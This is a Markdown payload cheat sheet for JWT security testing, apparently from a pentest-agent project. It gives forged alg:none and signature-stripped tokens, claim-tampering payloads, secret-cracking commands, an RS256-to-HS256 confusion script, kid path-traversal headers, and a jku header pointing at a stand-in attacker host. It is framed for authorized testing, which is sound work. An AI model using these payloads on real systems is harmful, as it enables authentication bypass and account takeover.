# payloads — jwt-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia de Segurança e Testes em Vulnerabilidades JWT.md` (Section 5: PAYLOADS / PROBES)

All probes are passive tampering of a token obtained legitimately during
testing. Do NOT run online brute-force against production without
rate-limit approval in `security-scope.yaml`.

---

## Token Anatomy Reminder

`HEADER.PAYLOAD.SIGNATURE` — three base64url parts.
- Header typically: `{"alg":"HS256","typ":"JWT"}`
- Payload: app-specific claims (`sub`, `exp`, `iat`, `role`, `admin`, `uid`)
- Signature: HMAC / RSA over `base64url(header) + "." + base64url(payload)`

---

## 1. Signature Strip (the third segment is empty)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9.
```

Note the trailing period — the token has three segments, the third is
empty. Some libraries treat this as "no signature to verify".

## 2. `alg: none` Attack

Header: `{"alg":"none","typ":"JWT"}` → `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

Full token (no signature):

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.
```

Variations to try (case & whitespace are library-specific):

- `{"alg":"None"}`
- `{"alg":"NONE"}`
- `{"alg":"nOnE"}`
- `{"alg":"none ","typ":"JWT"}` (trailing space)

Confirm via an authorized endpoint; expected if vulnerable: 200 + admin
resource.

## 3. Claim Tampering

Change `admin: false → true`, `role: "user" → "admin"`, or `uid: 123 → 1`.

```json
Original payload:  {"sub":"alice","role":"user","uid":123}
Tampered payload:  {"sub":"alice","role":"admin","uid":1}
```

Re-base64url, keep original signature (tests whether the server validates
the signature at all):

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsInVpZCI6MX0.<ORIGINAL_SIG>
```

## 4. HS256 Secret Cracking (Offline)

Only with explicit approval — the secret list is hashed offline, no
traffic to the target.

```bash
# jwt_tool
jwt_tool -t https://target/ -rc "Authorization: Bearer JWT_TOKEN" -C -d /wordlists/jwt.secrets.list

# hashcat (mode 16500 = JWS HS256/384/512)
echo "${JWT_TOKEN}" > hash.txt
hashcat -m 16500 hash.txt /wordlists/rockyou.txt
```

Common weak secrets to try first (from the source):
- `secret`, `password`, `key`, `jwt_secret`
- `your-256-bit-secret`
- Project name / product name
- `Crapi2020`, `OWASP`, `Jwt2020` (crAPI-style demos)

## 5. RS256 → HS256 Confusion

Force the server to validate an RS256-signed token using HS256 with the
public key as the HMAC secret.

```bash
# 1) Obtain the server's RS256 public key (PEM), from JWKS or
#    /.well-known/openid-configuration:
curl https://target/.well-known/jwks.json | jq

# 2) Craft a token with alg=HS256, signed using the PEM public key
#    as the HMAC secret.
python3 -c "
import jwt
pubkey = open('server_pub.pem','rb').read()
print(jwt.encode({'sub':'alice','role':'admin'}, pubkey, algorithm='HS256'))
"
```

Replace `Authorization: Bearer <token>` with the crafted token. If the
server accepts, it is using a library that infers algorithm from the
header without pinning.

## 6. `kid` / `jku` / `jwk` Header Injection

When the header contains a `kid`, `jku`, or `jwk` field, the server may
resolve signing material from attacker-influenced inputs.

### `kid` → SQLi / Path Traversal

```json
{"alg":"HS256","kid":"../../../dev/null"}
```

If the library reads `kid` as a filesystem path to a key file,
`/dev/null` is a zero-length "key" — sign the token with an empty
secret.

### `jku` — External Key Set URL

```json
{"alg":"RS256","jku":"https://attacker.example/jwks.json"}
```

Host `jwks.json` on attacker-controlled domain; the server fetches it
and trusts the attacker's public key for signature verification.

### `jwk` — Embedded Key

```json
{"alg":"RS256","jwk":{"kty":"RSA","kid":"evil","use":"sig","n":"...","e":"AQAB"}}
```

Attacker embeds their own public key in the header; bad libraries use
it to verify the signature.

## 7. Expired-Token Acceptance

Decode; change `exp` to a past unix timestamp (e.g. `1`). If the server
still accepts, `exp` is not being checked.

## 8. Token Not Invalidated After Logout / Password Change

1. Log in → obtain token A.
2. Log out (or change password) via UI / API.
3. Replay token A against a protected endpoint.

Expected if vulnerable: 200 on the replay — server has no revocation
store (stateless JWT anti-pattern).

## 9. Weak Claim Validation

```json
# Issuer confusion
{"iss":"https://attacker.example"}

# Audience confusion
{"aud":"different-app"}

# Nested object attacks in claim values (string → object)
{"sub":{"admin":true}}
```

## 10. Automated Sweep

```bash
# jwt_tool playbook - runs all known attacks and reports which pass/fail
jwt_tool -t https://target/ -rc "Authorization: Bearer JWT_TOKEN" -M pb

# Check a single token for common weaknesses
jwt_tool -t https://target/ -rc "Authorization: Bearer JWT_TOKEN" -T

# Attempt the algorithm-confusion attack (RS/ES → HS) with a given PEM
jwt_tool -t https://target/ -rc "Authorization: Bearer JWT_TOKEN" \
         -X k -pk server_pub.pem
```

---

## Decoding Helpers

```bash
# Decode header
echo "${JWT_TOKEN}" | cut -d. -f1 | base64 -d

# Decode payload
echo "${JWT_TOKEN}" | cut -d. -f2 | base64 -d

# Python one-liner
python3 -c "import jwt; print(jwt.decode('${JWT_TOKEN}', options={'verify_signature': False}))"
```

---

## Important — What NOT To Do

- Do NOT run `hashcat` against a secret suspected to be cryptographically
  strong (>16 random bytes); that is compute-wasted and generates
  heat/log that gives no signal.
- Do NOT perform online brute-force of signatures — 100% rate-limit
  trigger, 0% progress.
- Do NOT replay a production token against production to "test" — always
  clone the session in a scoped test account.
